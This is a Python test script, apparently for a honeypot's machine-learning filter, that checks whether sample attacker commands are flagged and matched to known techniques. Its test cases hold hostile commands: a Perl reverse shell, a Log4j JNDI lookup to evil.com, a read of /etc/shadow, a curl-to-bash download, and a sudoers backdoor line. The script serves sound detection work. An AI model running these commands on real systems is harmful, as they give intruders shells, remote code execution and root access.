#!/usr/bin/env python3
import sys
import os
import json
import time
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).resolve().parent.parent / "src"))

from cyanide.ml.cyanideML.model import HoneypotFilter
from cyanide.ml.cyanideML.knowledge_base import KnowledgeBase

def run_test():
    model_path = "ai_models/cyanideML/cyanideML.pkl"
    kb_path = "ai_models/cyanideML/knowledge_base.pkl"
    
    if not os.path.exists(model_path):
        print(f"[!] Model not found at {model_path}")
        return

    print(f"[*] Loading Production Model (Threshold: {HoneypotFilter.load(model_path).threshold})")
    model = HoneypotFilter.load(model_path)
    model.online_learning = False # Pure evaluation
    
    kb = KnowledgeBase()
    kb.load(kb_path)

    test_cases = [
        # 1. Reverse Shell (Perl)
        {"cmd": 'perl -e "use Socket;$i=\\\"1.2.3.4\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};"', "label": "Reverse Shell"},
        
        # 2. Log4j attempt
        {"cmd": "${jndi:ldap://evil.com/a}", "label": "Log4j JNDI"},
        
        # 3. Path Traversal
        {"cmd": "cat ../../../../../etc/shadow", "label": "Path Traversal"},
        
        # 4. Remote execution
        {"cmd": "curl -s http://103.111.92.12/update.sh | bash", "label": "Malware Drop"},
        
        # 5. Non-malicious long sentence (to verify no false positive)
        {"cmd": "the quick brown fox jumps over the lazy dog and buys some infrastructure in the cloud", "label": "English Text"},
        
        # 6. Sudoers modification
        {"cmd": "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", "label": "Privesc"},
    ]

    print(f"\n{'LABEL':<20} | {'VERDICT':<10} | {'DIST':<8} | {'MITRE MATCH'}")
    print("-" * 80)
    
    for case in test_cases:
        cmd = case["cmd"]
        is_a, reason, dist = model.process_log({"command": cmd, "username": "root", "dst_port": 22})
        verdict = "ANOMALY" if is_a else "Clean"
        
        search_res = kb.search(cmd)
        kb_display = "No Match"
        if search_res:
            kb_display = " | ".join([f"{r.get('id')} {r.get('name')}" for r in search_res if r.get('score', 0) > 0.1])
        
        print(f"{case['label']:<20} | {verdict:<10} | {dist:.4f} | {kb_display}")

if __name__ == "__main__":
    run_test()
